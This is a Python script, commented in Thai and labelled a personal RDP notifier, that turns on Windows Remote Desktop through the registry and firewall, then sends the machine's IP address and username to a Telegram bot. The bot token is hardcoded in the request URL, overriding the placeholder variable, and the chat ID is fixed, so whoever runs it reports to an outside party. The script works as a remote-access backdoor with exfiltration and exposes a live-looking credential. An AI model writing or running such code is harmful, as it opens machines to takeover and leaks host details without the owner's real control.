import subprocess
import socket
import requests
import time

# --- ตั้งค่า Telegram ---
# !!! ใส่ข้อมูลของคุณตรงนี้ !!!
TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"  # Token ที่ได้จาก BotFather
TELEGRAM_CHAT_ID = "7814794691"              # Chat ID ที่ได้จาก userinfobot

def send_telegram_message(message):
    """ฟังก์ชันสำหรับส่งข้อความไปที่ Telegram"""
    api_url = f"https://api.telegram.org/bot7623976463:AAGR_rxV5KQSAh9hL8uBEJ0bY-FUnWvdMHE/sendMessage"
    try:
        response = requests.post(api_url, json={'chat_id': TELEGRAM_CHAT_ID, 'text': message} )
        if response.status_code == 200:
            print("[SUCCESS] Sent notification to Telegram.")
        else:
            print(f"[ERROR] Failed to send message: {response.text}")
    except Exception as e:
        print(f"[ERROR] An exception occurred while sending message: {e}")

def get_local_ip():
    """ดึง IP Address ของเครื่องในเครือข่าย LAN"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)) # เชื่อมต่อไปยัง DNS ของ Google (ไม่ได้ส่งข้อมูลจริง)
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "Not Found"

def enable_rdp():
    """
    ใช้ Command Prompt ในฐานะ Admin เพื่อเปิดใช้งาน RDP ผ่าน Registry
    นี่เป็นวิธีที่ทรงพลังและต้องใช้ความระมัดระวัง
    """
    print("[INFO] Attempting to enable Remote Desktop...")
    try:
        # คำสั่งเพื่อเปิดใช้งาน RDP
        command_enable = 'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
        
        # คำสั่งเพื่ออนุญาต RDP ผ่าน Firewall
        command_firewall = 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes'

        # รันคำสั่งด้วยสิทธิ์ Admin (จะทำให้มีหน้าต่าง UAC เด้งขึ้นมาให้กดยืนยัน)
        # นี่คือจุดที่แสดงให้เห็นว่าการกระทำนี้ต้องได้รับอนุญาตจากผู้ใช้
        subprocess.run(["powershell", "-Command", f"Start-Process cmd -Verb RunAs -ArgumentList '/c {command_enable}'"], check=True)
        time.sleep(2) # รอสักครู่
        subprocess.run(["powershell", "-Command", f"Start-Process cmd -Verb RunAs -ArgumentList '/c {command_firewall}'"], check=True)
        
        print("[SUCCESS] RDP and Firewall rule should be enabled.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to execute command. You might need to run this script as an Administrator. Error: {e}")
        return False
    except Exception as e:
        print(f"[ERROR] An unexpected error occurred: {e}")
        return False

if __name__ == "__main__":
    print("--- RDP Personal Notifier ---")
    
    # 1. พยายามเปิดใช้งาน RDP
    if enable_rdp():
        # 2. รอสักครู่เพื่อให้การตั้งค่าสมบูรณ์
        print("[INFO] Waiting a moment for settings to apply...")
        time.sleep(5)

        # 3. ดึงข้อมูล IP และชื่อผู้ใช้
        ip_address = get_local_ip()
        username = subprocess.check_output("whoami", shell=True).decode().strip()

        # 4. สร้างข้อความและส่งไปที่ Telegram
        message = (
            f"✅ RDP Notifier ✅\n\n"
            f"Your computer is ready for a remote connection.\n\n"
            f"🖥️ IP Address: {ip_address}\n"
            f"👤 Username: {username}\n\n"
            f"You can now connect using Remote Desktop Client."
        )
        send_telegram_message(message)
    else:
        error_message = "❌ Failed to enable RDP. Please run the script as an Administrator and accept the UAC prompt."
        print(error_message)
        send_telegram_message(error_message)

